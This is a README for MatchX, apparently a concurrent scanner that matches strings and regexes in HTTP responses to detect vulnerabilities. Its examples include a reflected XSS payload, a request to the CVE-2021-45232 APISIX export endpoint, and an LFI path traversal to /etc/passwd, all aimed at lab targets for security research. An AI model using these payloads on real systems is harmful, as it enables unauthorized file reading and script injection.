<h1 align="center">MatchX</h1>

MatchX is specially designed for matching/finding `Strings` and `Regex patterns` in the HTTP responses with concurrency. This tool can help `Security researchers` to find multiple `CVE's` (that are already found) and `Vulnerabilities` like - Reflected XSS, SQLi, Sensitive data leakage, LFI etc.

## Installation

Run these commands in your terminal:
```
$ git clone https://github.com/Nefcore/MatchX.git
$ cd MatchX
$ sudo python3 setup.py install
$ matchx
```

## Arguments:

* `-u`: For Single URL.
* `-l`: For multiple URLs.
* `-mr`: For regex matching.
* `-mr`: For word/string matching.
* `--cookies`: If you want to use cookies.
* `--verbose`: For verbose output
* `--user-agent`: Specify user agent
* `-m`: Specify request method (GET/POST)
* `--data`: Specify POST data
* `--timeout`: Request timeout
* `--verify`: Verfiy SSL
* `-t`: Number of concurrent threads
* `-o`: For output file

## Finding Reflected XSS with MatchX

Let's find Reflected XSS on http://testphp.vulnweb.com:

Add `<script>alert(1)</script>` in words.txt.

```
$ echo "<script>alert(1)</script>" >> words.txt
```

Now run this command:

```
$ matchx -u "http://testphp.vulnweb.com/search.php?test=query" -mw words.txt --method POST --data "searchFor=<script>alert(1)</script>&goButton=go"
```
Here is the output:

```
 
    __  ___      __       __   _  __
   /  |/  /___ _/ /______/ /_ | |/ /
  / /|_/ / __ `/ __/ ___/ __ \|   / 
 / /  / / /_/ / /_/ /__/ / / /   |  
/_/  /_/\__,_/\__/\___/_/ /_/_/|_|  v1.0

                        (By Nefcore)

[INF] MatchX Engine (v1.0)
[WRN] Developers assume no liability and are not responsible for any misuse or damage.

[02-03-2022 09:10:40] [MATCHED] [<script>alert(1)</script>] http://testphp.vulnweb.com/search.php?test=query
```
output.json:

```
$ cat output.json
```

```json

{
    "URL": "http://testphp.vulnweb.com/search.php?test=query",
    "Status": 200,
    "Matched": true,
    "Word": "<script>alert(1)</script>"
}
```

## Finding CVE-2021-45232 with MatchX

Add `Consumers` in words.txt:

```
$ echo "Consumers" >> words.txt
```
Now run this command:

```
$ matchx -u "http://vuln/apisix/admin/migrate/export.txt" -mw words.txt -v
```

Here is the output:

```
    __  ___      __       __   _  __
   /  |/  /___ _/ /______/ /_ | |/ /
  / /|_/ / __ `/ __/ ___/ __ \|   / 
 / /  / / /_/ / /_/ /__/ / / /   |  
/_/  /_/\__,_/\__/\___/_/ /_/_/|_|  v1.0

                        (By Nefcore)

[INF] MatchX Engine (v1.0)
[WRN] Developers assume no liability and are not responsible for any misuse or damage.

[02-03-2022 09:23:44] [MATCHED] [Consumers] http://vuln/apisix/admin/migrate/export.txt
```

Similarly you can find many CVE's. 

## Finding LFI with MatchX

Let's find LFI on DVWA with MatchX:

Add `root:.*:0:0` regex pattern in regex.txt.

```
$ echo "root:.*:0:0" >> regex.txt
```

Now run this command:

```
$ matchx -u "http://dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd" -mr regex.txt --cookies "PHPSESSID={value}; security=low" -v
```

Here is the output:

```
    __  ___      __       __   _  __
   /  |/  /___ _/ /______/ /_ | |/ /
  / /|_/ / __ `/ __/ ___/ __ \|   / 
 / /  / / /_/ / /_/ /__/ / / /   |  
/_/  /_/\__,_/\__/\___/_/ /_/_/|_|  v1.0

                        (By Nefcore)

[INF] MatchX Engine (v1.0)
[WRN] Developers assume no liability and are not responsible for any misuse or damage.

[02-03-2022 08:42:35] [MATCHED] [root:.*:0:0] http://10.10.46.19/vulnerabilities/fi/?page=../../../../../../etc/passwd [1 time matched]
```
